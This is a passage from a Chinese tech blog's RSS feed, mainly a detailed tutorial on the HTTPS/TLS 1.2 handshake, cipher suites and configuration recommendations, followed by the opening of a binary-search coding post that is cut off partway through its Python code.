class="headerlink" title="REF"></a>REF</h2><p><a href="https://www.gokuweb.com/operation/d95eae05.html">https://www.gokuweb.com/operation/d95eae05.html</a><br><a href="https://blog.csdn.net/liuchunming033/article/details/48470575">https://blog.csdn.net/liuchunming033/article/details/48470575</a> </p><p><a href="https://juejin.im/post/6844903729632641031">https://juejin.im/post/6844903729632641031</a> </p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/htps-build/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>竟然有人能把https/TLS1.2协议讲的这么详细</title>
      <link>https://m01ly.github.io/2020/08/26/apple/</link>
      <guid>https://m01ly.github.io/2020/08/26/apple/</guid>
      <pubDate>Wed, 26 Aug 2020 07:38:15 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;1-https&quot;&gt;&lt;a href=&quot;#1-https&quot; class=&quot;headerlink&quot; title=&quot;1  https&quot;&gt;&lt;/a&gt;1  https&lt;/h2&gt;&lt;p&gt;SSL(Secure Sockets Layer) 安全套接层，是一种安全协议，经历了 SSL 1.0、2.0、3.0 版本后发展成了标准安全协议 - TLS(Transport Layer Security) 传输层安全性协议。TLS 有 1.0 (RFC 2246)、1.1(RFC 4346)、1.2(RFC 5246)、1.3(RFC 8446) 版本。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-https"><a href="#1-https" class="headerlink" title="1  https"></a>1  https</h2><p>SSL(Secure Sockets Layer) 安全套接层，是一种安全协议，经历了 SSL 1.0、2.0、3.0 版本后发展成了标准安全协议 - TLS(Transport Layer Security) 传输层安全性协议。TLS 有 1.0 (RFC 2246)、1.1(RFC 4346)、1.2(RFC 5246)、1.3(RFC 8446) 版本。</p><a id="more"></a><img src="/2020/08/26/apple/1597202957092.png" alt="1597202957092" style="zoom: 50%;"><h3 id="1-1-安全协议必备元素"><a href="#1-1-安全协议必备元素" class="headerlink" title="1.1 安全协议必备元素"></a>1.1 安全协议必备元素</h3><p>在一个不安全的信道传输，我们需要保证三点:</p><p>(1)一是保证数据来源可靠性(身份认证)及在通信过程中数据的完整性（防篡改和防伪造），有数字签名和HMAC两种做法。数字签名是用私钥对报文进行签名生成数字签名，然后公钥对数字签名进行验证，常见的有SM2，RSA等；HMAC是通信两边用同一个密钥，运行常见的哈希函数MD5，SHA-1等进行哈希运算生成字符串，然后两边生成的字符串进行比较。具体细节，请参见XXXXXXXXX。</p><p>(2)另外一种是保证数据机密性，即对数据进行加密传输，加密算法分为对称算法和非对称算法，非对称算法有两个密钥，公钥加密，私钥解密，安全性较高，但加解密速度较慢，例如RSA加密算法；对称算法只有一个密钥，对称算法又分流加密（CR4等）和分组密码算法（AES，3DES等），流加密速度更快，相比于非对称加密，对称算法加解密速度较快，安全性较低。</p><p>(3)防重放:加入新鲜因子,随机数等.</p><img src="/2020/08/26/apple/1597634074757.png" alt="1597634074757" style="zoom: 67%;"><p>因此通常一个安全协议的设计需要满足基础三点，保证数据完整性（防篡改）和机密性，综合效率及安全性分析，通常的做法是将对称算法与非对称算法结合使用，即利用非对称算法协商出一个会话密钥，然后会话密钥作为对称算法的密钥进行加密，HMAC运行。</p><h3 id="1-2-TSL-协议体系结构"><a href="#1-2-TSL-协议体系结构" class="headerlink" title="1.2 TSL 协议体系结构"></a>1.2 TSL 协议体系结构</h3><img src="/2020/08/26/apple/1597635119718.png" alt="1597635119718" style="zoom:80%;"><p>TLS的体系结构中包含两个协议子层，其中底层是SSL记录协议层（SSL Record Protocol Layer）；高层是SSL握手协议层（SSL HandShake Protocol Layer）。</p><p>TLS协议主要分为两层：</p><p>(1) TLS记录协议层的作用是为高层协议提供基本的安全服务。TLS记录协议针对HTTP协议进行了特别的设计，使得超文本的传输协议HTTP能够在TLS运行。纪录封装各种高层协议，具体实施压缩解压缩、加密解密、计算和校验MAC等与安全有关的操作。</p><p>(2) TLS握手协议层包括握手协议（HandShake Protocol）、密码参数修改协议（Change Cipher Spec Protocol）和告警协议（Alert Protocol）。握手层的这些协议用于管理信息的交换，允许应用协议传送数据之间相互验证，协商加密算法和生成密钥等。</p><p>其中最重要的是记录协议和握手协议：</p><p>(1) TLS记录协议：它建立在可靠的传输（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能。</p><p>(2) TLS握手协议：它建立在TLS记录协议之上，用于在实际的数据传输开始之前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p><p>如下图所示,可以看到TLS握手层是建立在TLS记录层之上的。</p><p><img src="/2020/08/26/apple/1597635346378.png" alt="1597635346378"></p><h3 id="1-3-TLS密码套件结构"><a href="#1-3-TLS密码套件结构" class="headerlink" title="1.3 TLS密码套件结构"></a>1.3 TLS密码套件结构</h3><p><img src="/2020/08/26/apple/1597654968578.png" alt="1597654968578"></p><p>密码套件是客户端与服务器约定交互过程中需要的密码算法系列，如上图所示，以TLS开头，</p><p>（1）第一个参数为密钥交换算法，即协商预主密钥pre-master key所用的算法，主要有两类。分别是</p><p>（a）基于Diffie-Hellman交换算法的：ECDHE，DHE，DH，ECDH</p><p>DH密钥交换原理如下图,图中的k即为pre-master key:</p><img src="/2020/08/26/apple/1597651450749.png" alt="1597651450749" style="zoom:67%;"><p>DH和ECDH主要不同在于基于的困难问题稍有不同，DH是基于离散对数困难问题，而ECDH是基于椭圆曲线上的离散对数问题；任何基于离散对数上的都可以换算到椭圆曲线上。椭圆曲线上密钥长度只需要较短的即可达到基础域中较长的安全性，例如160比特的椭圆曲线密钥和1024比特的RSA密钥的安全性相当。越小的密钥在速度、效率、带宽、存储上有着许多优势 。</p><p>对于DHE与DH的主要不同在于后面有个E，E代表了“临时”，即在握手流程中，作为服务器端，ECDH少了一步计算Pb的过程，Pb用证书中的公钥代替，而证书对应的私钥就是Xb。由此可见，使用ECDH密钥交换算法，服务器必须采用ECC证书；服务器不发送server key exchange报文，因为发送certificate报文时，证书本身就包含了Pb信息。 </p><p>（b）基于RSA的密钥交换算法：客户端利用RSA公钥加密pre-master key，服务器端私钥解密出预主密钥</p><img src="/2020/08/26/apple/1597651364544.png" alt="1597651364544" style="zoom: 67%;"><p>综上几种密钥交换算法比较如下表所示:</p><table><thead><tr><th></th><th>ECDHE</th><th>ECDH</th><th>DHE</th><th>DH</th><th>RSA</th></tr></thead><tbody><tr><td>server key exchange</td><td>Y</td><td>N（证书中的公钥Pb）</td><td>Y</td><td>N（证书中的公钥及Pb）</td><td>N</td></tr><tr><td>前向安全性</td><td>Y</td><td>N</td><td>Y</td><td>N</td><td>N</td></tr></tbody></table><p>（2）第二部分为身份认证算法，即数字签名算法，这里根据密码套件不同，代表的含义也不同。</p><p>（a）密钥交换算法为ECDHE情况下，签名算法指的是 serverkeyexchange被签名的算法，只有2种ECDSA和RSA，具体是哪种完全取决于证书的公钥类型（ECC RSA）。如果你的证书是ECC公钥，那么服务器不可能选择ECDHE_RSA这种套件。 </p><p>（b）ECDH的情况下，签名算法 指的是 证书自身的被签名算法。 如果服务器部署的是RSA签名算法的证书，那么必须使用ECDH_RSA套件；反之亦然。 </p><p>（3）第三部分AES_128_GCM，主要为加密算法，一般是加密算法+加密强度（128位/256位）+工作模式（CBC/GCM），用于后面加密传输所用的算法，保证数据传输过程中的机密性。</p><p>（4） 第四部分SHA256为哈希算法，用于HMAC和PRF，保证数据在传输过程中的完整性。</p><h2 id="2-https协议总框架"><a href="#2-https协议总框架" class="headerlink" title="2 https协议总框架"></a>2 https协议总框架</h2><p>如下图为https协议总框架,首先</p><p>非对称协商会话密钥，然后用会话密钥加密传输。</p><img src="/2020/08/26/apple/1597630781001.png" alt="1597630781001" style="zoom:67%;"><p>下面以具体wireshark抓包具体报文进行解说。（密码套件TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256为例）拦截<a href="http://www.google.com的https连接报文.其中2.1到2.6为握手层协议,2.7为记录协议/">www.google.com的https连接报文。其中2.1到2.6为握手层协议,2.7为记录协议</a>.</p><h3 id="2-1-Client-hello"><a href="#2-1-Client-hello" class="headerlink" title="2.1 Client hello"></a>2.1 Client hello</h3><p>这条消息是客户端向服务器端发送连接请求。</p><p><img src="/2020/08/26/apple/1597635473766.png" alt="1597635473766"></p><p>Version: 协议版本（protocol version）指示客户端支持的最佳协议版本</p><p>Random: 一个 32 字节数据，28 字节是随机生成的 (图中的 Random Bytes)；剩余的 4 字节包含额外的信息，与客户端时钟有关 (图中使用的是 GMT Unix Time)。在握手时，客户端和服务器都会提供随机数，客户端的暂记作 random_C (用于后续的密钥的生成)。这种随机性对每次握手都是独一无二的，在身份验证中起着举足轻重的作用。它可以防止 <a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>，并确认初始数据交换的完整性。</p><p>Session ID: 在第一次连接时，会话 ID（session ID）字段是空的，这表示客户端并不希望恢复某个已存在的会话。典型的会话 ID 包含 32 字节随机生成的数据，一般由服务端生成通过 ServerHello 返回给客户端。</p><p>Cipher Suites: 密码套件（cipher suite）块是由客户端支持的所有密码套件组成的列表，该列表是按优先级顺序排列的.</p><pre><code>Cipher Suites (19 suites)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 (0xc024)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 (0xc023)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (0xc028)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (0xc027)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)    Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)    Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)    Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA256 (0x003c)    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)    Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)    Cipher Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)</code></pre><p>Compression: 客户端可以提交一个或多个支持压缩的方法。默认的压缩方法是 null，代表没有压缩</p><p>Extensions: 扩展（extension）块由任意数量的扩展组成。这些扩展会携带额外数据</p><h3 id="2-2-Server-hello"><a href="#2-2-Server-hello" class="headerlink" title="2.2 Server hello"></a>2.2 Server hello</h3><p>这条消息是服务器对client hello的响应。</p><p><img src="/2020/08/26/apple/1597635614246.png" alt="1597635614246"></p><p>这个消息的结构与 ClientHello 类似，只是每个字段只包含一个选项，其中包含服务端的 random_S 参数 (用于后续的密钥协商)。服务器无需支持客户端支持的最佳版本。如果服务器不支持与客户端相同的版本，可以提供某个其他版本以期待客户端能够接受。</p><p>图中的 <code>Cipher Suite</code> 是后续密钥协商和身份验证要用的加密套件TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256，此处选择的密钥交换与签名算法是 ECDHE_RSA，对称加密算法是 AES-128，后面会讲到这个</p><p>还有一点默认情况下 TLS 压缩都是关闭的，因为 <a href="https://zh.wikipedia.org/wiki/CRIME">CRIME</a> 攻击会利用 TLS 压缩恢复加密认证 cookie，实现会话劫持，而且一般配置 gzip 等内容压缩后再压缩 TLS 分片效益不大又额外占用资源，所以一般都关闭 TLS 压缩</p><h3 id="2-3-Certificate"><a href="#2-3-Certificate" class="headerlink" title="2.3 Certificate"></a>2.3 Certificate</h3><p>典型的 Certificate 消息用于携带服务器 X.509 <a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E4%BB%BB%E9%8F%88">证书链</a>。 服务器必须保证它发送的证书与选择的算法套件一致。</p><p><img src="/2020/08/26/apple/1597645649605.png" alt="1597645649605"></p><h4 id="2-3-1-证书内容"><a href="#2-3-1-证书内容" class="headerlink" title="2.3.1 证书内容"></a>2.3.1 证书内容</h4><p>注意证书链的顺序，最下层证书在前（用户证书在前，上级证书在后）。发送的证书是二进制格式，并非base64之后的格式。有个技巧，在wireshark右键<strong>“导出分组字节流”</strong>功能，然后保存证书,后缀为der，是可以变成一个正常证书的（二进制格式）。</p><img src="/2020/08/26/apple/1597648718865.png" alt="1597648718865" style="zoom:150%;"><p>下面对证书内容进行分析：</p><p>图中从右到左分别是1级根证书为Google Trust Services，二级中间证书为GTS CA，三级证书为google-analytics；从上到下为每个证书中的详细信息。</p><p>首先需要特别说明证书中的重点内容是什么？</p><p>（1）版本：Version，V3。对应的是X.509 V3标准</p><p>（2）序列号：证书颁发者唯一序列号</p><p>（3）签名算法：<strong>注意！证书中的签名算法指的是上级证书运行的签名算法，生成数字签名的；而不是</strong></p><p><strong>本级证书拥有的签名算法。</strong>例如，3级证书中的签名算法为sha256RSA，应该与2级证书的公钥RSA是一致的。</p><p>（４）签名哈希算法：同样是上级证书签名时用的哈希算法。</p><p>（５）公钥及公钥参数:<strong>注意本即证书的公钥，该公钥不是用于验证2级证书生成的数字签名的.**该公钥是用于后面</strong>server key exchange的;具体用法如下:</p><p>(a)对于ECDHE和DHE密钥交换算法,服务器端需要server key exchange,发送用于DH的公钥Pb及对公钥的数字签名(防止公钥在通信过程被篡改),那服务器证书的公钥就是用来验证该签名的;</p><p>(b)对于不需要server key exchange的DH,ECDH密钥交换算法,服务器证书中的公钥就是DH密钥交换的Pb;</p><p>(c) 对于不需要server key exchange的RSA密钥交换算法:服务器证书中的公钥是用于加密第三个随机数预主密钥pre-master key的.</p><h4 id="2-3-2-证书验证过程"><a href="#2-3-2-证书验证过程" class="headerlink" title="2.3.2 证书验证过程"></a>2.3.2 证书验证过程</h4><p>证书链验证过程如下:(简易图)</p><p>首先利用一级证书中的RSA公钥验证二级证书,再用二级证书中的RSA公钥验证三级证书,即服务器证书;服务器证书中的ECC公钥,公钥参数ECDSA用于密钥交换,具体功能在2.3.1已阐述;</p><p><img src="/2020/08/26/apple/1597651071958.png" alt="1597651071958"></p><h3 id="2-4-第三个随机数的密钥协商"><a href="#2-4-第三个随机数的密钥协商" class="headerlink" title="2.4  第三个随机数的密钥协商"></a>2.4  第三个随机数的密钥协商</h3><p>不同的密码套件,也会有不一样的密钥协商算法具体1.3节已分析;该次交互选择的密码交互算法为ECDHE_ECDSA;</p><h4 id="2-4-1-Server-key-exchange"><a href="#2-4-1-Server-key-exchange" class="headerlink" title="2.4.1 Server key exchange"></a>2.4.1 Server key exchange</h4><p>从下面可以看到报文信息如下:</p><p>(1)公钥Pubkey:服务器端发送Pb(对应的私钥为b),以及DH用到的相关参数,比如选择的椭圆曲线等</p><p>(2)数字签名Signature:服务器利用私钥b运行ECDSA签名算法生成的数字签名,保证公钥来源的可靠性和完整性,客户端收到该签名后,用之前收到的服务器证书中的ECC公钥进行签名验证.</p><p><img src="/2020/08/26/apple/1597651555493.png" alt="1597651555493"></p><h4 id="2-4-2-Client-key-exchange"><a href="#2-4-2-Client-key-exchange" class="headerlink" title="2.4.2 Client key exchange"></a>2.4.2 Client key exchange</h4><p>客户端发送公钥Pa</p><p><img src="/2020/08/26/apple/1597652043883.png" alt="1597652043883"></p><p>然后双方根据Diffie-Hellman算法分别计算出pre-master key;具体计算过程在1.3已写.</p><h3 id="2-5-Finished-Encrypted-Handshake-Message"><a href="#2-5-Finished-Encrypted-Handshake-Message" class="headerlink" title="2.5 Finished (Encrypted Handshake Message)"></a>2.5 Finished (Encrypted Handshake Message)</h3><p>这个报文的目的就是告诉对端自己在整个握手过程中收到了什么数据，发送了什么数据。来保证中间没人篡改报文。客户端和服务器端都会分别发送.</p><p>其次，这个报文作用就是确认密钥的正确性。因为Encrypted handshake message是使用对称密钥进行加密的第一个报文，如果这个报文加解密校验成功，那么就说明对称密钥是正确的。</p><p>计算方法也比较简单，将之前<strong>所有</strong>的握手数据（包括接受、发送），计算md运算，然后计算prf，然后就是使用协商好的对称密钥进行加密了。 ( 从client hello开始，到目前准备发送“Encrypted handshake message”前，自己所有收到和发送的handshake类型的握手数据。 )</p><p><img src="/2020/08/26/apple/1597653653860.png" alt="1597653653860"></p><h3 id="2-6-密钥产生"><a href="#2-6-密钥产生" class="headerlink" title="2.6 密钥产生"></a>2.6 密钥产生</h3><p><img src="/2020/08/26/apple/1597652305214.png" alt="1597652305214"></p><p>如上图所示,此时客户端,服务器端都已经获取全部的计算协商密钥需要的信息: 两个明文随机数 CR 和 SR与自己计算产生的 Pre-master，然后得到主密钥master.为了保证信息的完整性和机密性，TSL需要有六个密钥：四个密钥和两个IV。为了信息的可信性，客户端需要一个密钥（HMAC），为了加密要有一个密钥，为了分组加密要一个IV，服务也是如此。</p><pre><code>master= PRF(Pre_master, &quot;master secret&quot;, CR + SR)</code></pre><h4 id="2-6-1-生成主密钥Master-key"><a href="#2-6-1-生成主密钥Master-key" class="headerlink" title="2.6.1 生成主密钥Master key"></a>2.6.1 生成主密钥Master key</h4><p>主密钥Master key的生成如下,图中的MD5算法是在密码套件中指定的;根据三个参数预备主密钥PM,服务器端随机数SR,客户端随机数CR,经过不断的迭代,最终生成48字节的主密钥master key.</p><p><img src="/2020/08/26/apple/1598427741876.png" alt="1598427741876"></p><h4 id="2-6-2-生成密钥材料"><a href="#2-6-2-生成密钥材料" class="headerlink" title="2.6.2 生成密钥材料"></a>2.6.2 生成密钥材料</h4><p> 密钥材料需要以下6个,具体生成过程如下图所示.</p><p>(1)客户端MAC密钥 :Auth .Key</p><p>(2)服务器端MAC密钥 :Auth .Key</p><p>(3) 客户端加密密钥及IV:Enc.key</p><p>(4) 服务器端加密密钥及IV:Enc.key,IV</p><p>(5) 客户端分组密码需要的IV</p><p>(6) 服务器端分组密码需要的IV</p><p><img src="/2020/08/26/apple/1598427757814.png" alt="1598427757814"> </p><p><img src="/2020/08/26/apple/1598427767706.png" alt="1598427767706"></p><h3 id="2-7-记录协议"><a href="#2-7-记录协议" class="headerlink" title="2.7  记录协议"></a>2.7  记录协议</h3><p>记录协议负责在传输连接上交换的所有底层消息，并且可以配置加密。每一条 TLS 记录以一个短标头开始。标头包含记录内容的类型 (或子协议)、协议版本和长度。原始消息经过分段 (或者合并)、压缩、添加认证码、加密转为 TLS 记录的数据部分。 如下图所示.对应用数据进行分段,对分段信息先压缩,在加上对压缩进行的MAC,然后对压缩信息+MAC进行加密,最后加记录头,形成报文,发送.</p><p><img src="/2020/08/26/apple/1597653267305.png" alt="1597653267305"></p><p>报文如下:</p><p><img src="/2020/08/26/apple/1597653406484.png" alt="1597653406484"></p><h2 id="3-https-安全性分析"><a href="#3-https-安全性分析" class="headerlink" title="3 https 安全性分析"></a>3 https 安全性分析</h2><h3 id="3-1-TLS版本的选择"><a href="#3-1-TLS版本的选择" class="headerlink" title="3.1 TLS版本的选择"></a>3.1 TLS版本的选择</h3><p>目前在SSL/TLS家族中主要有7个协议: SSL v2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2和TLSv1.3。</p><p>1 SSL v2, SSL v3, TLS v1.0 , TLS v1.1协议均有明确的安全缺陷</p><ol><li><p>SSL v2: DROWN攻击</p></li><li><p>SSL v3: POODLE攻击</p></li><li><p>TLS v1.0: BEAST和POODLE攻击</p></li><li><p>TLS v1.1 密码套件较老,已不安全 </p></li></ol><p>2、TLS v1.2与v1.3目前均无已知的安全缺陷</p><p><strong>推荐使用TLS v1.2与v1.3.</strong></p><h3 id="3-2-密码套件的选择"><a href="#3-2-密码套件的选择" class="headerlink" title="3.2 密码套件的选择"></a>3.2 密码套件的选择</h3><h4 id="3-2-1-根据证书去选择密码套件"><a href="#3-2-1-根据证书去选择密码套件" class="headerlink" title="3.2.1 根据证书去选择密码套件"></a>3.2.1 根据证书去选择密码套件</h4><p>当服务器配置ECC证书时，加密套件只能选择XXX_ECDSA_XXX或者ECDH_XXX。</p><p>当服务器配置RSA证书时，只能选择RSA_XXX或者ECDHE_RSA_XXX形式的加密套件。</p><p>需要注意的是，如果加密套件选择ECDH_RSA或者ECDH_ECDSA时，由于ECDH加密套件默认表明了握手需要ECC证书（即ECC证书的公钥充当握手中server key exchange中的公钥，证书的私钥同样也是握手过程中的私钥，握手过程不需要server key exchange），所有第二部分RSA和ECDSA表明的是想要的上级签发该类型的服务器证书。</p><p>如果加密套件选择ECDHE_XXXX，则第二部分RSA和ECDSA指的是用来签名握手中server key exchange中传过来的秘密值的签名算法。</p><h4 id="3-2-2从密码套件的各个部分去分析其安全性-具体如下"><a href="#3-2-2从密码套件的各个部分去分析其安全性-具体如下" class="headerlink" title="3.2.2从密码套件的各个部分去分析其安全性,具体如下:"></a>3.2.2从密码套件的各个部分去分析其安全性,具体如下:</h4><p>(1)密钥交换：ECDHE，DHE，ECDH，DHE，ADH, RSA, PSK</p><p>其中RSA，ECDH，DH，PSK均不具有前向安全性，一旦私钥丢失，则以往所有的通信内容将会泄露，使用前向安全性算法（ECDHE，DHE），可以避免这种问题。</p><p>ADH为Anonymous DH，匿名DH算法，不提供身份验证，禁用。</p><p>PSK算法是预存key在客户端和服务端，因为PSK必须要预置密钥，这个预置的过程就代表了服务端已经知道有哪些客户端需要访问了，所以基于PSK的TLS适合在内部系统中使用，而不适合在公网环境用来提供Web服务。</p><p><strong>综上,推荐使用的密钥交换算法为:ECDHE，DHE</strong></p><p>(2)数字签名：ECDSA, RSA(2048位以上), DSS (又称DSA)</p><p>其中DSA只支持1024bits，不安全算法,RSA要2048位以上才安全.ECDSA速度较快,安全性也较高.</p><p><strong>推荐使用数字签名算法ECDSA和RSA.</strong></p><p>(3) 加密算法：<strong>DES，3DES ,**AES(256),ChaCha20</strong>,RC4, **ChaCha20</p><p>3DES运行缓慢且易被攻击。RC4已不安全</p><p>ChaCha20是一种流加密算法，实现较为简单，并且比纯软件实现的AES性能更好。</p><p>在支持AES指令的硬件平台上，推荐优先选择AES-GCM算法,不支持AES指令的硬件平台，ChaCha20性能优于AES</p><p>Camellia算法支持128比特的分组长度,128、192和256比特的密钥与AES的接口相同，Camellia算法128比特密钥的加、解密过程共有18轮,采用Feistel结构,加、解密过程完全相同,只是子密钥注入顺序相反</p><p>Camellia算法由NTT和Mitsubishi Electric Corporation于2000年联合开发，作为欧洲新一代的加密标准。与AES算法相比,Camellia算法在各种软硬件平台上表现出与之相当的加密速度。除了在各种软件和硬件平台上的高效性这一显著特点,它的另外一个特点是针对小规模硬件平台的设计.</p><p><strong>推荐使用AES(256),ChaCha20ChaCha20</strong></p><p>(4)<strong>工作模式：</strong>CBC，GCM</p><p>CBC 模式密码 —— 易受 BEAST 和 Lucky 13 攻击,禁用</p><p><strong>推荐使用:GCM</strong></p><p>(5)MAC：md5，SHA-1（又名SHA），SHA-2（又名SHA128，SHA256和SHA384）</p><p>​     SHA1存在碰攻击，如果HTTPS证书使用sha1，扩展存在中间人攻击；  Md5也被破解</p><p><strong>推荐使用SHA256和SHA384</strong></p><h3 id="3-3-优先使用的密码套件"><a href="#3-3-优先使用的密码套件" class="headerlink" title="3.3 优先使用的密码套件"></a>3.3 优先使用的密码套件</h3><p>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_DHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</p><h2 id="REF"><a href="#REF" class="headerlink" title="REF:"></a>REF:</h2><p> <a href="https://cshihong.github.io/2019/05/09/SSL%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/">https://cshihong.github.io/2019/05/09/SSL%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</a> </p><p> <a href="https://juejin.im/post/6844903667577929742#heading-12">https://juejin.im/post/6844903667577929742#heading-12</a> </p><p> <a href="https://www.jianshu.com/p/cf8c2f2cd18a">https://www.jianshu.com/p/cf8c2f2cd18a</a> </p><p> <a href="https://www.cnblogs.com/zhuqil/archive/2012/10/06/ssl_detail.html">https://www.cnblogs.com/zhuqil/archive/2012/10/06/ssl_detail.html</a> </p><p> <a href="https://blog.csdn.net/mrpre/article/details/77868570">https://blog.csdn.net/mrpre/article/details/77868570</a> </p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">网络编程</category>
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/apple/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>二分查找相关的题目</title>
      <link>https://m01ly.github.io/2020/05/26/leetcode-binary/</link>
      <guid>https://m01ly.github.io/2020/05/26/leetcode-binary/</guid>
      <pubDate>Tue, 26 May 2020 02:11:11 GMT</pubDate>
      
      <description>&lt;p&gt;二分查找也称折半查找（Binary Search），是一种在有序数组中查找某一特定元素的搜索算法。我们可以从定义可知，运用二分搜索的前提是数组必须是有序的，这里需要注意的是，我们的输入不一定是数组，也可以是数组中某一区间的起始位置和终止位置&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>二分查找也称折半查找（Binary Search），是一种在有序数组中查找某一特定元素的搜索算法。我们可以从定义可知，运用二分搜索的前提是数组必须是有序的，这里需要注意的是，我们的输入不一定是数组，也可以是数组中某一区间的起始位置和终止位置<a id="more"></a></p><h2 id="0-经典二分法"><a href="#0-经典二分法" class="headerlink" title="0 经典二分法"></a>0 经典二分法</h2><p><strong>中间位置的计算：</strong></p><p>mid=left+(right-left)//2或者使用位运算mid=left + ((right - left) &gt;&gt; 1)，注意不能使用 （left + right ）/ 2,否则有可能会导致溢出。</p><p><strong>计算思路：</strong></p><p>二分查找的执行过程如下</p><p>1.从已经排好序的数组或区间中，取出中间位置的元素，将其与我们的目标值进行比较，判断是否相等，如果相等</p><p>则返回。</p><p>2.如果 nums[mid] 和 target 不相等，则对 nums[mid] 和 target 值进行比较大小，通过比较结果决定是从 mid</p><p>的左半部分还是右半部分继续搜索。如果 target &gt; nums[mid] 则右半区间继续进行搜索，即 left = mid + 1; 若</p><p>target &lt; nums[mid] 则在左半区间继续进行搜索，即 right = mid -1；</p><p><strong>注意事项：</strong></p><p>1.while (left &lt; = right) { } 注意括号内为 left &lt;= right ,而不是 left &lt; right ，如果我们设置条件为 left &lt; right 则当我们执行到最后一步时，则我们的 left 和 right 重叠时，则会跳出循环，返回 -1，区间内不存在该元素，但是不是这样的，我们的 left 和 right 此时指向的就是我们的目标元素 ，但是此时 left = right 跳出循环</p><p><strong>代码：</strong></p><p><strong>（1）非递归写法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  mid        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span>    res<span class="token 